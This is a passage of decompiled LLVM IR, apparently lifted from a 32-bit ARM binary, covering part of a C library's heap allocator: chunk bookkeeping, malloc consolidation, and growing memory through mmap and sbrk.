dec_label_pc_12c14:                               ; preds = %dec_label_pc_12c0c.dec_label_pc_12c14_crit_edge, %dec_label_pc_12c0c.preheader
  %v0_12c34 = phi i32 [ %v2_12c08, %dec_label_pc_12c0c.dec_label_pc_12c14_crit_edge ], [ %ip.promoted, %dec_label_pc_12c0c.preheader ]
  %v0_12c58 = phi i32 [ %v1_12c04, %dec_label_pc_12c0c.dec_label_pc_12c14_crit_edge ], [ %v0_12c0454, %dec_label_pc_12c0c.preheader ]
  %v1_12c14 = add i32 %v0_12c58, 12
  %v2_12c14 = inttoptr i32 %v1_12c14 to i32*
  %v3_12c14 = load i32, i32* %v2_12c14, align 4
  store i32 %v3_12c14, i32* @lr, align 4
  %v9_12c18 = icmp eq i32 %v3_12c14, %v0_12c58
  br i1 %v9_12c18, label %dec_label_pc_12c20, label %dec_label_pc_12c40

dec_label_pc_12c20:                               ; preds = %dec_label_pc_12c14
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r0.global-to-local, align 4
  %v1_12c24 = load i32, i32* @r8, align 4
  %v2_12c24 = add i32 %v1_12c24, ptrtoint (i32* @global_var_26934.581 to i32)
  %v3_12c24 = inttoptr i32 %v2_12c24 to i32*
  %v4_12c24 = load i32, i32* %v3_12c24, align 4
  %v2_12c28 = sub i32 -1, %v0_12c34
  %v3_12c28 = and i32 %v0_12c28, %v2_12c28
  store i32 %v3_12c28, i32* @r4, align 4
  %v1_12c2c = load i32, i32* @r5, align 4
  %v4_12c2c = mul i32 %v1_12c2c, 4
  %v5_12c2c = add i32 %v4_12c2c, %v4_12c24
  store i32 %v5_12c2c, i32* %r3.global-to-local, align 4
  %v1_12c30 = add i32 %v0_12c58, 8
  store i32 %v1_12c30, i32* %r0.global-to-local, align 4
  %v2_12c34 = mul i32 %v0_12c34, 2
  store i32 %v2_12c34, i32* %ip.global-to-local, align 4
  %v2_12c38 = add i32 %v5_12c2c, 820
  %v3_12c38 = inttoptr i32 %v2_12c38 to i32*
  store i32 %v3_12c28, i32* %v3_12c38, align 4
  %v0_12bb8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12bc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12bb8

dec_label_pc_12c40:                               ; preds = %dec_label_pc_12c14
  %v1_12c40 = add i32 %v3_12c14, 4
  %v2_12c40 = inttoptr i32 %v1_12c40 to i32*
  %v3_12c40 = load i32, i32* %v2_12c40, align 4
  store i32 %v3_12c40, i32* %r3.global-to-local, align 4
  %v1_12c44 = and i32 %v3_12c40, -4
  store i32 %v1_12c44, i32* %r2.global-to-local, align 4
  %v0_12c48 = load i32, i32* @sl, align 4
  %v2_12c48 = sub i32 %v1_12c44, %v0_12c48
  store i32 %v2_12c48, i32* %ip.global-to-local, align 4
  %v1_12c4c = add i32 %v3_12c14, 12
  %v2_12c4c = inttoptr i32 %v1_12c4c to i32*
  %v3_12c4c = load i32, i32* %v2_12c4c, align 4
  store i32 %v3_12c4c, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_12c48, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_12c40
  %v6_12c54 = add i32 %v1_12c44, %v3_12c14
  store i32 %v6_12c54, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_12c40, %bb143
  %v2_12c58 = add i32 %v3_12c4c, 8
  %v3_12c58 = inttoptr i32 %v2_12c58 to i32*
  store i32 %v0_12c58, i32* %v3_12c58, align 4
  %v0_12c5c = load i32, i32* %r3.global-to-local, align 4
  %v1_12c5c = load i32, i32* %r0.global-to-local, align 4
  %v2_12c5c = add i32 %v1_12c5c, 12
  %v3_12c5c = inttoptr i32 %v2_12c5c to i32*
  store i32 %v0_12c5c, i32* %v3_12c5c, align 4
  %v4_12c60 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_12b3c_crit_edge, label %dec_label_pc_12c6c

.dec_label_pc_12b3c_crit_edge:                    ; preds = %bb144
  %v5_12c60 = add i32 %v4_12c60, 8
  store i32 %v5_12c60, i32* %r4.global-to-local, align 4
  %v4_12c64 = load i32, i32* %r2.global-to-local, align 4
  %v5_12c64 = add i32 %v4_12c64, 4
  %v6_12c64 = inttoptr i32 %v5_12c64 to i32*
  %v7_12c64 = load i32, i32* %v6_12c64, align 4
  store i32 %v7_12c64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12b3c

dec_label_pc_12c6c:                               ; preds = %bb144
  %v1_12c6c = load i32, i32* @sl, align 4
  %v2_12c6c = add i32 %v1_12c6c, %v4_12c60
  store i32 %v2_12c6c, i32* %r1.global-to-local, align 4
  %v1_12c74 = load i32, i32* @r6, align 4
  %v2_12c74 = add i32 %v1_12c74, 8
  %v3_12c74 = inttoptr i32 %v2_12c74 to i32*
  store i32 %v2_12c6c, i32* %v3_12c74, align 4
  %v0_12c78 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c78 = load i32, i32* @r6, align 4
  %v2_12c78 = add i32 %v1_12c78, 12
  %v3_12c78 = inttoptr i32 %v2_12c78 to i32*
  store i32 %v0_12c78, i32* %v3_12c78, align 4
  %v0_12c7c = load i32, i32* @r6, align 4
  %v1_12c7c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c7c = add i32 %v1_12c7c, 8
  %v3_12c7c = inttoptr i32 %v2_12c7c to i32*
  store i32 %v0_12c7c, i32* %v3_12c7c, align 4
  %v0_12c80 = load i32, i32* @r6, align 4
  %v1_12c80 = load i32, i32* %r1.global-to-local, align 4
  %v2_12c80 = add i32 %v1_12c80, 12
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  store i32 %v0_12c80, i32* %v3_12c80, align 4
  %tmp210 = icmp ult i32 %v1_12c6c, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_12c6c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v8_12c8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v8_12c8c, i32* %r3.global-to-local, align 4
  %v4_12c90 = load i32, i32* %r1.global-to-local, align 4
  %v6_12c90 = add i32 %v8_12c8c, 48
  %v7_12c90 = inttoptr i32 %v6_12c90 to i32*
  store i32 %v4_12c90, i32* %v7_12c90, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_12c6c, %bb145
  %v0_12c94 = load i32, i32* @sl, align 4
  %v1_12c94 = or i32 %v0_12c94, 1
  store i32 %v1_12c94, i32* %r2.global-to-local, align 4
  %v0_12c98 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c98 = or i32 %v0_12c98, 1
  store i32 %v1_12c98, i32* %r3.global-to-local, align 4
  %v0_12c9c = load i32, i32* @lr, align 4
  %v1_12c9c = add i32 %v0_12c9c, 8
  store i32 %v1_12c9c, i32* %r4.global-to-local, align 4
  %v2_12ca0 = add i32 %v0_12c9c, 4
  %v3_12ca0 = inttoptr i32 %v2_12ca0 to i32*
  store i32 %v1_12c94, i32* %v3_12ca0, align 4
  %v0_12ca4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ca4 = load i32, i32* %r1.global-to-local, align 4
  %v3_12ca4 = add i32 %v1_12ca4, %v0_12ca4
  %v4_12ca4 = inttoptr i32 %v3_12ca4 to i32*
  store i32 %v0_12ca4, i32* %v4_12ca4, align 4
  %v0_12ca8 = load i32, i32* %r3.global-to-local, align 4
  %v1_12ca8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ca8 = add i32 %v1_12ca8, 4
  %v3_12ca8 = inttoptr i32 %v2_12ca8 to i32*
  store i32 %v0_12ca8, i32* %v3_12ca8, align 4
  br label %dec_label_pc_130fc

dec_label_pc_12cb0.loopexit:                      ; preds = %dec_label_pc_12bd0
  br label %dec_label_pc_12cb0

dec_label_pc_12cb0:                               ; preds = %dec_label_pc_12cb0.loopexit, %dec_label_pc_128c4, %dec_label_pc_128cc
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  %v4_12cb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12cb8, i32* @r0, align 4
  %v1_12cbc = add i32 %v4_12cb8, 44
  %v2_12cbc = inttoptr i32 %v1_12cbc to i32*
  %v3_12cbc = load i32, i32* %v2_12cbc, align 4
  store i32 %v3_12cbc, i32* %ip.global-to-local, align 4
  %v1_12cc0 = add i32 %v3_12cbc, 4
  %v2_12cc0 = inttoptr i32 %v1_12cc0 to i32*
  %v3_12cc0 = load i32, i32* %v2_12cc0, align 4
  %v0_12cc4 = load i32, i32* @sl, align 4
  %v1_12cc4 = add i32 %v0_12cc4, 16
  store i32 %v1_12cc4, i32* %r1.global-to-local, align 4
  %v1_12cc8 = and i32 %v3_12cc0, -4
  store i32 %v1_12cc8, i32* %r3.global-to-local, align 4
  %v3_12ccc = icmp ult i32 %v1_12cc8, %v1_12cc4
  br i1 %v3_12ccc, label %dec_label_pc_12cfc, label %dec_label_pc_12cd8

dec_label_pc_12cd8:                               ; preds = %dec_label_pc_12cb0
  %v2_12cd8 = sub i32 %v1_12cc8, %v0_12cc4
  %v2_12cdc = add i32 %v0_12cc4, %v3_12cbc
  store i32 %v2_12cdc, i32* %r1.global-to-local, align 4
  %v1_12ce0 = or i32 %v2_12cd8, 1
  store i32 %v1_12ce0, i32* %r3.global-to-local, align 4
  %v1_12ce4 = or i32 %v0_12cc4, 1
  store i32 %v1_12ce4, i32* %r2.global-to-local, align 4
  %v1_12ce8 = add i32 %v3_12cbc, 8
  store i32 %v1_12ce8, i32* %r4.global-to-local, align 4
  store i32 %v1_12ce4, i32* %v2_12cc0, align 4
  %v0_12cf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cf0 = load i32, i32* @r0, align 4
  %v2_12cf0 = add i32 %v1_12cf0, 44
  %v3_12cf0 = inttoptr i32 %v2_12cf0 to i32*
  store i32 %v0_12cf0, i32* %v3_12cf0, align 4
  %v0_12cf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_12cf4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cf4 = add i32 %v1_12cf4, 4
  %v3_12cf4 = inttoptr i32 %v2_12cf4 to i32*
  store i32 %v0_12cf4, i32* %v3_12cf4, align 4
  br label %dec_label_pc_130fc

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_12cb0
  %v1_12cfc = inttoptr i32 %v4_12cb8 to i32*
  %v2_12cfc = load i32, i32* %v1_12cfc, align 4
  store i32 %v2_12cfc, i32* %r3.global-to-local, align 4
  %v1_12d00 = and i32 %v2_12cfc, 2
  store i32 %v1_12d00, i32* %ip.global-to-local, align 4
  %v2_12d00 = icmp eq i32 %v1_12d00, 0
  %v1_12d04 = add i32 %v4_12cb8, 860
  %v2_12d04 = inttoptr i32 %v1_12d04 to i32*
  %v3_12d04 = load i32, i32* %v2_12d04, align 4
  store i32 %v3_12d04, i32* %r1.global-to-local, align 4
  br i1 %v2_12d00, label %dec_label_pc_12d1c, label %dec_label_pc_12d0c

dec_label_pc_12d0c:                               ; preds = %dec_label_pc_12cfc
  %v0_12d0c = call i32 @__malloc_consolidate()
  %v0_12d10 = load i32, i32* @sl, align 4
  %v1_12d10 = add i32 %v0_12d10, -7
  store i32 %v1_12d10, i32* %r0.global-to-local, align 4
  %v1_12d14 = call i32 @malloc(i32 %v1_12d10)
  store i32 %v1_12d14, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_130f8

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12cfc
  %v1_12d1c = add i32 %v4_12cb8, 844
  %v2_12d1c = inttoptr i32 %v1_12d1c to i32*
  %v3_12d1c = load i32, i32* %v2_12d1c, align 4
  store i32 %v3_12d1c, i32* %r3.global-to-local, align 4
  %v3_12d20 = icmp ult i32 %v0_12cc4, %v3_12d1c
  %v1_12d24 = add i32 %v3_12d04, -1
  store i32 %v1_12d24, i32* %sb.global-to-local, align 4
  br i1 %v3_12d20, label %dec_label_pc_12df8, label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12d1c
  %v1_12d2c = add i32 %v4_12cb8, 852
  %v2_12d2c = inttoptr i32 %v1_12d2c to i32*
  %v3_12d2c = load i32, i32* %v2_12d2c, align 4
  store i32 %v3_12d2c, i32* %r2.global-to-local, align 4
  %v1_12d30 = add i32 %v4_12cb8, 848
  %v2_12d30 = inttoptr i32 %v1_12d30 to i32*
  %v3_12d30 = load i32, i32* %v2_12d30, align 4
  store i32 %v3_12d30, i32* %r3.global-to-local, align 4
  %v6_12d38 = icmp slt i32 %v3_12d30, %v3_12d2c
  br i1 %v6_12d38, label %dec_label_pc_12d3c, label %dec_label_pc_12df8

dec_label_pc_12d3c:                               ; preds = %dec_label_pc_12d2c
  %v1_12d3c = add i32 %v0_12cc4, 10
  %v2_12d40 = add i32 %v1_12d3c, %v3_12d04
  store i32 %v2_12d40, i32* %r3.global-to-local, align 4
  %v2_12d44 = sub i32 0, %v3_12d04
  %v3_12d44 = and i32 %v2_12d40, %v2_12d44
  store i32 %v3_12d44, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_12d44, %v0_12cc4
  br i1 %tmp211, label %dec_label_pc_12d50, label %dec_label_pc_12df8

dec_label_pc_12d50:                               ; preds = %dec_label_pc_12d3c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12d44, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12d68 = call i32 @mmap(i32 0, i32 %v3_12d44, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12d68, i32* %r0.global-to-local, align 4
  %v7_12d6c = icmp eq i32 %v6_12d68, -1
  br i1 %v7_12d6c, label %dec_label_pc_12d50.dec_label_pc_12df8_crit_edge, label %dec_label_pc_12d74

dec_label_pc_12d50.dec_label_pc_12df8_crit_edge:  ; preds = %dec_label_pc_12d50
  %v1_12e1c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12df8

dec_label_pc_12d74:                               ; preds = %dec_label_pc_12d50
  %v1_12d74 = urem i32 %v6_12d68, 8
  store i32 %v1_12d74, i32* %r2.global-to-local, align 4
  %v2_12d74 = icmp eq i32 %v1_12d74, 0
  br i1 %v2_12d74, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_12d74
  %v2_12d78 = sub nsw i32 8, %v1_12d74
  store i32 %v2_12d78, i32* %r3.global-to-local, align 4
  %v2_12d7c = load i32, i32* @r4, align 4
  %v3_12d7c = sub i32 %v2_12d7c, %v2_12d78
  %v3_12d80 = add i32 %v2_12d78, %v6_12d68
  store i32 %v3_12d80, i32* %lr.global-to-local, align 4
  %v2_12d88 = or i32 %v3_12d7c, 2
  store i32 %v2_12d88, i32* %r2.global-to-local, align 4
  %v5_12d90 = inttoptr i32 %v3_12d80 to i32*
  store i32 %v2_12d78, i32* %v5_12d90, align 4
  %v1_12d94 = load i32, i32* %r2.global-to-local, align 4
  %v2_12d94 = load i32, i32* %lr.global-to-local, align 4
  %v3_12d94 = add i32 %v2_12d94, 4
  %v4_12d94 = inttoptr i32 %v3_12d94 to i32*
  store i32 %v1_12d94, i32* %v4_12d94, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_12d74
  store i32 %v6_12d68, i32* %lr.global-to-local, align 4
  %v1_12d8c47 = load i32, i32* @r4, align 4
  %v2_12d8c48 = or i32 %v1_12d8c47, 2
  store i32 %v2_12d8c48, i32* %r3.global-to-local, align 4
  %v3_12d98 = inttoptr i32 %v6_12d68 to i32*
  store i32 0, i32* %v3_12d98, align 4
  %v1_12d9c = load i32, i32* %r3.global-to-local, align 4
  %v2_12d9c = load i32, i32* %lr.global-to-local, align 4
  %v3_12d9c = add i32 %v2_12d9c, 4
  %v4_12d9c = inttoptr i32 %v3_12d9c to i32*
  store i32 %v1_12d9c, i32* %v4_12d9c, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12da8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12da8, i32* %ip.global-to-local, align 4
  %v1_12dac = add i32 %v4_12da8, 848
  %v2_12dac = inttoptr i32 %v1_12dac to i32*
  %v3_12dac = load i32, i32* %v2_12dac, align 4
  store i32 %v3_12dac, i32* %r3.global-to-local, align 4
  %v1_12db0 = add i32 %v4_12da8, 856
  %v2_12db0 = inttoptr i32 %v1_12db0 to i32*
  %v3_12db0 = load i32, i32* %v2_12db0, align 4
  store i32 %v3_12db0, i32* %r2.global-to-local, align 4
  %v1_12db4 = add i32 %v3_12dac, 1
  store i32 %v1_12db4, i32* %r3.global-to-local, align 4
  %v7_12dbc = icmp sgt i32 %v1_12db4, %v3_12db0
  br i1 %v7_12dbc, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_12db4, i32* %v2_12db0, align 4
  %v0_12dc0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12dc0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_12dc0 = phi i32 [ %v4_12da8, %.thread27 ], [ %v1_12dc0.pre, %bb147 ]
  %v0_12dc0 = phi i32 [ %v1_12db4, %.thread27 ], [ %v0_12dc0.pre, %bb147 ]
  %v2_12dc0 = add i32 %v1_12dc0, 848
  %v3_12dc0 = inttoptr i32 %v2_12dc0 to i32*
  store i32 %v0_12dc0, i32* %v3_12dc0, align 4
  %v0_12dc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12dc4 = add i32 %v0_12dc4, 868
  %v2_12dc4 = inttoptr i32 %v1_12dc4 to i32*
  %v3_12dc4 = load i32, i32* %v2_12dc4, align 4
  store i32 %v3_12dc4, i32* %r3.global-to-local, align 4
  %v1_12dc8 = add i32 %v0_12dc4, 880
  %v2_12dc8 = inttoptr i32 %v1_12dc8 to i32*
  %v3_12dc8 = load i32, i32* %v2_12dc8, align 4
  store i32 %v3_12dc8, i32* %r2.global-to-local, align 4
  %v0_12dcc = load i32, i32* @r4, align 4
  %v2_12dcc = add i32 %v0_12dcc, %v3_12dc4
  store i32 %v2_12dcc, i32* %r1.global-to-local, align 4
  %v1_12dd0 = add i32 %v0_12dc4, 872
  %v2_12dd0 = inttoptr i32 %v1_12dd0 to i32*
  %v3_12dd0 = load i32, i32* %v2_12dd0, align 4
  store i32 %v3_12dd0, i32* %r3.global-to-local, align 4
  %v1_12dd8 = add i32 %v0_12dc4, 884
  %v2_12dd8 = inttoptr i32 %v1_12dd8 to i32*
  %v3_12dd8 = load i32, i32* %v2_12dd8, align 4
  store i32 %v3_12dd8, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_12dcc, %v3_12dc8
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_12dcc, i32* %v2_12dc8, align 4
  %v0_12de0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12de0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_12de0 = phi i32 [ %v0_12dc4, %bb148 ], [ %v1_12de0.pre, %bb149 ]
  %v0_12de0 = phi i32 [ %v2_12dcc, %bb148 ], [ %v0_12de0.pre, %bb149 ]
  %v2_12de0 = add i32 %v1_12de0, 868
  %v3_12de0 = inttoptr i32 %v2_12de0 to i32*
  store i32 %v0_12de0, i32* %v3_12de0, align 4
  %v0_12de4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12de4 = load i32, i32* %r3.global-to-local, align 4
  %v2_12de4 = add i32 %v1_12de4, %v0_12de4
  store i32 %v2_12de4, i32* %r1.global-to-local, align 4
  %v1_12de8 = load i32, i32* %r2.global-to-local, align 4
  %v0_12dec = load i32, i32* %lr.global-to-local, align 4
  %v1_12dec = add i32 %v0_12dec, 8
  store i32 %v1_12dec, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_12de4, %v1_12de8
  br i1 %tmp213, label %bb151, label %dec_label_pc_130f8

bb151:                                            ; preds = %bb150
  %v5_12df0 = load i32, i32* %ip.global-to-local, align 4
  %v6_12df0 = add i32 %v5_12df0, 884
  %v7_12df0 = inttoptr i32 %v6_12df0 to i32*
  store i32 %v2_12de4, i32* %v7_12df0, align 4
  br label %dec_label_pc_130f8

dec_label_pc_12df8:                               ; preds = %dec_label_pc_12d3c, %dec_label_pc_12d1c, %dec_label_pc_12d50.dec_label_pc_12df8_crit_edge, %dec_label_pc_12d2c
  %v1_12e1c = phi i32 [ %v1_12e1c.pre, %dec_label_pc_12d50.dec_label_pc_12df8_crit_edge ], [ %v0_12cc4, %dec_label_pc_12d2c ], [ %v0_12cc4, %dec_label_pc_12d1c ], [ %v0_12cc4, %dec_label_pc_12d3c ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %ip.global-to-local, align 4
  %v4_12e00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12e00, i32* %r3.global-to-local, align 4
  %v1_12e04 = add i32 %v4_12e00, 44
  %v2_12e04 = inttoptr i32 %v1_12e04 to i32*
  %v3_12e04 = load i32, i32* %v2_12e04, align 4
  store i32 %v3_12e04, i32* %r0.global-to-local, align 4
  %v1_12e08 = add i32 %v4_12e00, 864
  %v2_12e08 = inttoptr i32 %v1_12e08 to i32*
  %v3_12e08 = load i32, i32* %v2_12e08, align 4
  store i32 %v3_12e08, i32* %r2.global-to-local, align 4
  %v1_12e0c = add i32 %v4_12e00, 840
  %v2_12e0c = inttoptr i32 %v1_12e0c to i32*
  %v3_12e0c = load i32, i32* %v2_12e0c, align 4
  store i32 %v3_12e0c, i32* %r3.global-to-local, align 4
  %v1_12e10 = add i32 %v3_12e04, 4
  %v2_12e10 = inttoptr i32 %v1_12e10 to i32*
  %v3_12e10 = load i32, i32* %v2_12e10, align 4
  store i32 %v3_12e10, i32* %r1.global-to-local, align 4
  %v1_12e18 = urem i32 %v3_12e08, 2
  %v2_12e18 = icmp eq i32 %v1_12e18, 0
  %v1_12e14 = add i32 %v1_12e1c, 16
  %v2_12e1c = add i32 %v1_12e14, %v3_12e0c
  store i32 %v2_12e1c, i32* %r3.global-to-local, align 4
  %v1_12e20 = and i32 %v3_12e10, -4
  store i32 %v1_12e20, i32* @r8, align 4
  br i1 %v2_12e18, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_12df8
  %v3_12e24 = sub i32 %v2_12e1c, %v1_12e20
  store i32 %v3_12e24, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_12df8, %bb152
  %v0_12e28 = phi i32 [ %v2_12e1c, %dec_label_pc_12df8 ], [ %v3_12e24, %bb152 ]
  %v1_12e28 = load i32, i32* %sb.global-to-local, align 4
  %v2_12e28 = add i32 %v1_12e28, %v0_12e28
  store i32 %v2_12e28, i32* %r3.global-to-local, align 4
  %v1_12e2c = sub i32 -1, %v1_12e28
  store i32 %v1_12e2c, i32* %fp.global-to-local, align 4
  %v2_12e30 = and i32 %v2_12e28, %v1_12e2c
  store i32 %v2_12e30, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_12e30, 1
  br i1 %tmp154, label %dec_label_pc_12e54, label %dec_label_pc_12e40

dec_label_pc_12e40:                               ; preds = %bb153
  store i32 %v2_12e30, i32* %r0.global-to-local, align 4
  %v1_12e44 = call i32 @__GI_sbrk(i32 %v2_12e30)
  store i32 %v1_12e44, i32* %r0.global-to-local, align 4
  %v3_12e48 = icmp eq i32 %v1_12e44, -1
  store i32 %v1_12e44, i32* @r4, align 4
  br i1 %v3_12e48, label %dec_label_pc_12e54, label %dec_label_pc_12ec0

dec_label_pc_12e54:                               ; preds = %dec_label_pc_12e40, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r1.global-to-local, align 4
  %v4_12e5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12e5c, i32* %r6.global-to-local, align 4
  %v1_12e60 = add i32 %v4_12e5c, 864
  %v2_12e60 = inttoptr i32 %v1_12e60 to i32*
  %v3_12e60 = load i32, i32* %v2_12e60, align 4
  store i32 %v3_12e60, i32* %r3.global-to-local, align 4
  %v1_12e64 = urem i32 %v3_12e60, 2
  %v2_12e64 = icmp eq i32 %v1_12e64, 0
  br i1 %v2_12e64, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_12e54
  %v1_12e68 = load i32, i32* @r8, align 4
  %v2_12e68 = load i32, i32* %sb.global-to-local, align 4
  %v3_12e68 = add i32 %v2_12e68, %v1_12e68
  %v2_12e6c = load i32, i32* @r5, align 4
  %v3_12e6c = add i32 %v3_12e68, %v2_12e6c
  store i32 %v3_12e6c, i32* %r3.global-to-local, align 4
  %v2_12e70 = load i32, i32* %fp.global-to-local, align 4
  %v3_12e70 = and i32 %v2_12e70, %v3_12e6c
  store i32 %v3_12e70, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_12e54
  %v0_12e74.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_12e74 = phi i32 [ %v0_12e74.pr, %.thread29thread-pre-split ], [ %v3_12e70, %bb155 ]
  %v2_12e74 = icmp ugt i32 %v0_12e74, 1048575
  br i1 %v2_12e74, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_12e8c = phi i32 [ %v0_12e74, %.thread29 ], [ 1048576, %bb156 ]
  %v1_12e7c = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_12e8c, %v1_12e7c
  br i1 %tmp214, label %dec_label_pc_12e84, label %dec_label_pc_130e8

dec_label_pc_12e84:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12e8c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12ea0 = call i32 @mmap(i32 0, i32 %v0_12e8c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12ea0, i32* %r0.global-to-local, align 4
  %v3_12ea4 = icmp eq i32 %v6_12ea0, -1
  %v8_12ea4 = icmp eq i32 %v6_12ea0, -1
  store i32 %v6_12ea0, i32* @r4, align 4
  br i1 %v8_12ea4, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_12e84
  %v1_12eac = load i32, i32* %r6.global-to-local, align 4
  %v2_12eac = add i32 %v1_12eac, 864
  %v3_12eac = inttoptr i32 %v2_12eac to i32*
  %v4_12eac = load i32, i32* %v3_12eac, align 4
  %v2_12eb0 = load i32, i32* @r5, align 4
  %v3_12eb0 = add i32 %v2_12eb0, %v6_12ea0
  store i32 %v3_12eb0, i32* %r0.global-to-local, align 4
  %v2_12eb4 = and i32 %v4_12eac, -2
  store i32 %v2_12eb4, i32* %r3.global-to-local, align 4
  store i32 %v2_12eb4, i32* %v3_12eac, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_12e84, %bb158
  br i1 %v3_12ea4, label %dec_label_pc_12ec0, label %dec_label_pc_12ec4

dec_label_pc_12ec0:                               ; preds = %.thread32, %dec_label_pc_12e40
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ec4

dec_label_pc_12ec4:                               ; preds = %.thread32, %dec_label_pc_12ec0
  %v0_12ec4 = load i32, i32* @r4, align 4
  %v7_12ec4 = icmp eq i32 %v0_12ec4, -1
  br i1 %v7_12ec4, label %dec_label_pc_130e8, label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %dec_label_pc_12ec4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r2.global-to-local, align 4
  %v4_12ed4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 32) to i32*), align 4
  store i32 %v4_12ed4, i32* %ip.global-to-local, align 4
  store i32 %v3_12e04, i32* %r2.global-to-local, align 4
  %v1_12edc = add i32 %v4_12ed4, 872
  %v2_12edc = inttoptr i32 %v1_12edc to i32*
  %v3_12edc = load i32, i32* %v2_12edc, align 4
  %v1_12ee0 = load i32, i32* @r8, align 4
  %v2_12ee0 = add i32 %v1_12ee0, %v3_12e04
  store i32 %v2_12ee0, i32* %r1.global-to-local, align 4
  %v0_12ee4 = load i32, i32* @r5, align 4
  %v2_12ee4 = add i32 %v0_12ee4, %v3_12edc
  store i32 %v2_12ee4, i32* %r3.global-to-local, align 4
  %v9_12ee8 = icmp eq i32 %v0_12ec4, %v2_12ee0
  br i1 %v9_12ee8, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_12ecc
  store i32 %v2_12ee4, i32* %v2_12edc, align 4
